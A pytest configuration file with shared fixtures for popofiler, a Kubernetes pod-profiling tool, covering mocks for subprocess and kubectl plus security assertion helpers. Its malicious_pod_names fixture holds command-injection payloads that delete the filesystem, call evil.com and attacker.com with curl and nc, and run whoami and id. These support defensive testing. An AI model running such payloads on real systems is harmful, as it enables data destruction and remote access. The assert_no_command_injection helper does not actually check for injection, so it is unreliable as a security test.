"""
Pytest configuration and shared fixtures for popofiler test suite
"""
import pytest
import sys
import os
from unittest.mock import patch, MagicMock

# Add the current directory to Python path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import the module under test
import popofiler


@pytest.fixture
def mock_constants():
    """Fixture to mock popofiler constants for testing"""
    with patch.multiple(
        popofiler,
        K8S_CONTEXT='test-context',
        PROJECT_NAME='test-project', 
        POD_NAME_ANTI_PATTERN='anti-pattern',
        NAMESPACE='test-namespace',
        TRACE_RANDOM_KEY='test-random-key-12345'
    ):
        yield


@pytest.fixture
def sample_pod_name():
    """Fixture providing a sample pod name for testing"""
    return "test-project-pod-123"


@pytest.fixture
def sample_kubectl_output():
    """Fixture providing sample kubectl output"""
    return """NAME\tREADY\tSTATUS\tRESTARTS\tAGE
test-project-pod-123\t1/1\tRunning\t0\t1d
test-project-pod-456\t1/1\tRunning\t0\t2d
other-pod\t1/1\tRunning\t0\t1d"""


@pytest.fixture
def mock_run_command_success():
    """Fixture to mock successful run_command calls"""
    with patch('popofiler.run_command', return_value=(True, "success")) as mock:
        yield mock


@pytest.fixture
def mock_run_command_failure():
    """Fixture to mock failed run_command calls"""
    with patch('popofiler.run_command', return_value=(False, "error")) as mock:
        yield mock


@pytest.fixture
def mock_subprocess_success():
    """Fixture to mock successful subprocess.Popen calls"""
    mock_process = MagicMock()
    mock_process.returncode = 0
    mock_process.communicate.return_value = ("success output", "")
    mock_process.poll.return_value = 0
    
    with patch('subprocess.Popen', return_value=mock_process) as mock:
        yield mock


@pytest.fixture
def mock_subprocess_failure():
    """Fixture to mock failed subprocess.Popen calls"""
    mock_process = MagicMock()
    mock_process.returncode = 1
    mock_process.communicate.return_value = ("", "error output")
    mock_process.poll.return_value = 1
    
    with patch('subprocess.Popen', return_value=mock_process) as mock:
        yield mock


@pytest.fixture
def mock_tqdm():
    """Fixture to mock tqdm progress bar"""
    mock_pbar = MagicMock()
    with patch('tqdm.tqdm') as mock:
        mock.return_value.__enter__.return_value = mock_pbar
        yield mock


@pytest.fixture
def mock_colorama():
    """Fixture to mock colorama initialization"""
    with patch('colorama.init') as init_mock, patch('colorama.deinit') as deinit_mock:
        yield init_mock, deinit_mock


@pytest.fixture
def capture_output():
    """Fixture to capture stdout and stderr"""
    from io import StringIO
    import sys
    
    old_stdout = sys.stdout
    old_stderr = sys.stderr
    
    stdout_capture = StringIO()
    stderr_capture = StringIO()
    
    sys.stdout = stdout_capture
    sys.stderr = stderr_capture
    
    yield stdout_capture, stderr_capture
    
    sys.stdout = old_stdout
    sys.stderr = old_stderr


@pytest.fixture
def temp_directory(tmp_path):
    """Fixture providing a temporary directory"""
    original_cwd = os.getcwd()
    os.chdir(tmp_path)
    yield tmp_path
    os.chdir(original_cwd)


@pytest.fixture
def mock_sys_argv():
    """Fixture to mock sys.argv for testing main function"""
    original_argv = sys.argv.copy()
    yield sys.argv
    sys.argv[:] = original_argv


@pytest.fixture(autouse=True)
def reset_module_state():
    """Auto-used fixture to reset module state between tests"""
    # Store original values
    original_values = {
        'K8S_CONTEXT': getattr(popofiler, 'K8S_CONTEXT', None),
        'PROJECT_NAME': getattr(popofiler, 'PROJECT_NAME', None),
        'POD_NAME_ANTI_PATTERN': getattr(popofiler, 'POD_NAME_ANTI_PATTERN', None),
        'NAMESPACE': getattr(popofiler, 'NAMESPACE', None),
        'TRACE_RANDOM_KEY': getattr(popofiler, 'TRACE_RANDOM_KEY', None),
    }
    
    yield
    
    # Restore original values (if they were modified during tests)
    for key, value in original_values.items():
        if value is not None:
            setattr(popofiler, key, value)


# Test markers for categorization
def pytest_configure(config):
    """Configure custom pytest markers"""
    config.addinivalue_line("markers", "unit: Unit tests for isolated functionality")
    config.addinivalue_line("markers", "integration: Integration tests for external systems")
    config.addinivalue_line("markers", "security: Security tests for vulnerability scanning")
    config.addinivalue_line("markers", "performance: Performance and benchmark tests")
    config.addinivalue_line("markers", "slow: Tests that take more than a few seconds")
    config.addinivalue_line("markers", "network: Tests requiring network connectivity")
    config.addinivalue_line("markers", "docker: Tests requiring Docker")
    config.addinivalue_line("markers", "kubernetes: Tests requiring Kubernetes")


# Custom assertions
class PopofilerAssertions:
    """Custom assertion helpers for popofiler tests"""
    
    @staticmethod
    def assert_kubectl_command_structure(command, context=None, namespace=None):
        """Assert that a kubectl command has proper structure"""
        assert "kubectl" in command
        if context:
            assert f"--context {context}" in command
        if namespace:
            assert f"--namespace {namespace}" in command
    
    @staticmethod
    def assert_no_command_injection(command, input_value):
        """Assert that input value doesn't cause command injection"""
        # This is a basic check - in reality, subprocess handles escaping
        assert input_value in command
    
    @staticmethod  
    def assert_docker_security_flags(command):
        """Assert that Docker commands include proper security flags"""
        assert "--rm" in command  # Cleanup
        assert "--privileged" not in command  # No privileged mode
        assert "--net=host" not in command and "--network=host" not in command  # No host networking


@pytest.fixture
def popofiler_assertions():
    """Fixture providing custom assertion helpers"""
    return PopofilerAssertions()


# Parametrized fixtures for common test data
@pytest.fixture(params=[
    "simple-pod",
    "pod-with-numbers-123",  
    "pod-with-hyphens-and-dots.example",
])
def valid_pod_names(request):
    """Parametrized fixture for valid pod names"""
    return request.param


@pytest.fixture(params=[
    "pod; rm -rf /",
    "pod && curl evil.com",
    "pod | nc attacker.com 4444",
    "pod`whoami`",
    "pod$(id)",
])
def malicious_pod_names(request):
    """Parametrized fixture for malicious pod names (for security testing)"""
    return request.param


@pytest.fixture(params=[
    "",
    "   ",
    "\t\n",
    "pod'with'quotes",
    'pod"with"double"quotes',
])
def edge_case_pod_names(request):
    """Parametrized fixture for edge case pod names"""
    return request.param